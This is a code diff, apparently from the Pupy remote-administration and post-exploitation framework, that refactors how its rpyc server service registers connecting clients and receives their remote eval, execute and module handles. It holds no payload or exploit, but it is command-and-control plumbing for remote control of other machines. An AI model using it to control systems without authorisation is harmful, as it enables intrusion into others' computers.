@@ -32,27 +32,89 @@ class PupyService(rpyc.Service):
         super(PupyService, self).__init__(*args, **kwargs)
         self._local_cleanups = []
         self._singles = {}
+
         self.modules = None
-        self.initialized = False
-        self.initialized_lock = threading.Lock()
+        self.namespace = None
+        self.modules = None
+        self.builtin = self.builtins = None
+        self.register_remote_cleanup = None
+        self.unregister_remote_cleanup = None
+        self.obtain_call = None
+        self.exit = None
+        self.eval = None
+        self.execute = None
+        self.pupyimporter = None
+        self.infos = None
+        self.get_infos = None
 
     def on_connect(self):
-        try:
-            # code that runs when a connection is created
-            # (to init the serivce, if needed)
-            self._conn._config.update(dict(
-                allow_safe_attrs = True,
-                allow_public_attrs = False,
-                allow_pickle = False,
-                allow_getattr = True,
-                allow_setattr = False,
-                allow_delattr = False,
-                import_custom_exceptions = False,
-                instantiate_custom_exceptions = False,
-                instantiate_oldstyle_exceptions = False,
-            ))
+        self._conn._config.update(dict(
+            allow_safe_attrs = True,
+            allow_public_attrs = False,
+            allow_pickle = False,
+            allow_getattr = True,
+            allow_setattr = False,
+            allow_delattr = False,
+            import_custom_exceptions = False,
+            instantiate_custom_exceptions = False,
+            instantiate_oldstyle_exceptions = False,
+        ))
 
-            self.modules = None
+        self.modules = None
+
+        self.exposed_stdin = sys.stdin
+        self.exposed_stdout = sys.stdout
+        self.exposed_stderr = sys.stderr
+
+    def exposed_initialize_v1(
+            self,
+            namespace, modules, builtin,
+            register_cleanup, unregister_cleanup,
+            obtain_call,
+            remote_exit, remote_eval, remote_execute,
+            pupyimporter,
+            infos
+       ):
+        self.namespace = namespace
+        self.modules = modules
+        self.builtin = self.builtins = builtin
+        self.register_remote_cleanup = register_cleanup
+        self.unregister_remote_cleanup = unregister_cleanup
+        self.obtain_call = obtain_call
+        self.exit = remote_exit
+        self.eval = remote_eval
+        self.execute = remote_execute
+        self.pupyimporter = pupyimporter
+        self.infos = msgpack.loads(infos)
+        self.get_infos = lambda: self.infos
+
+        self.pupy_srv.add_client(self)
+
+    def register_local_cleanup(self, cleanup):
+        self._local_cleanups.append(cleanup)
+
+    def unregister_local_cleanup(self, cleanup):
+        self._local_cleanups.remove(cleanup)
+
+    def single(self, ctype, *args, **kwargs):
+        single = self._singles.get(ctype)
+        if not single:
+            single = ctype(*args, **kwargs)
+            self._singles[ctype] = single
+
+        return single
+
+    def on_disconnect(self):
+        self.pupy_srv.remove_client(self)
+        for cleanup in self._local_cleanups:
+            cleanup()
+
+    # Compatibility call
+    def exposed_set_modules(self, modules):
+        try:
+            self.modules = modules
+            self.builtin = modules.__builtin__
+            self.builtins = self.builtin
 
             try:
                 self.namespace = self._conn.root.namespace
@@ -83,46 +145,14 @@ class PupyService(rpyc.Service):
             self.eval = self._conn.root.eval
             self.get_infos = self._conn.root.get_infos
 
-            self.exposed_stdin = sys.stdin
-            self.exposed_stdout = sys.stdout
-            self.exposed_stderr = sys.stderr
-
-            with self.initialized_lock:
-                self.initialized = True
-
-                if self.modules:
-                    self.pupy_srv.add_client(self)
+            self.pupy_srv.add_client(self)
 
         except Exception as e:
             logging.error(traceback.format_exc())
-
-    def register_local_cleanup(self, cleanup):
-        self._local_cleanups.append(cleanup)
-
-    def unregister_local_cleanup(self, cleanup):
-        self._local_cleanups.remove(cleanup)
-
-    def single(self, ctype, *args, **kwargs):
-        single = self._singles.get(ctype)
-        if not single:
-            single = ctype(*args, **kwargs)
-            self._singles[ctype] = single
-
-        return single
-
-    def on_disconnect(self):
-        self.pupy_srv.remove_client(self)
-        for cleanup in self._local_cleanups:
-            cleanup()
-
-    def exposed_set_modules(self, modules):
-        with self.initialized_lock:
-            if self.initialized and not self.modules:
-                self.pupy_srv.add_client(self)
-
-            self.modules = modules
-            self.builtin = modules.__builtin__
-            self.builtins = self.builtin
+            try:
+                self._conn.close()
+            except:
+                pass
 
     def exposed_msgpack_dumps(self, js, compressed=False):
         data = msgpack.dumps(js)
